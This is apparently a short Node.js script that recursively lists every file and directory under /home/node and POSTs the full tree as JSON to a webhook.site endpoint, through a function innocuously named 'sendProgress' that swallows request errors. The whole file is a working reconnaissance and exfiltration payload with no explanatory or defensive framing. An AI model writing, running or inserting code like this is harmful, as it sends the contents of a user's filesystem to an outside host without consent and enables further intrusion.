const WEBHOOK = 'https://webhook.site/01234567-89ab-cdef-0123-456789abcdef';
const https = require('https');
const { URL } = require('url');
const fs = require('fs');
const fsp = fs.promises;
const path = require('path');

function sendProgress(obj) {
  const u = new URL(WEBHOOK);
  const req = https.request({ hostname: u.hostname, path: u.pathname, method: 'POST' });
  req.on('error', () => {});
  req.end(JSON.stringify(obj));
}

const START_DIR = '/home/node';
async function listDir(dir, depth = 0, result = []) {
  const entries = await fsp.readdir(dir, { withFileTypes: true });
  for (const e of entries) {
    const full = path.join(dir, e.name);
    result.push({ path: full, type: e.isDirectory() ? 'directory' : 'file' });
    if (e.isDirectory()) await listDir(full, depth + 1, result);
  }
  return result;
}

(async () => sendProgress({ tree: await listDir(START_DIR) }))();
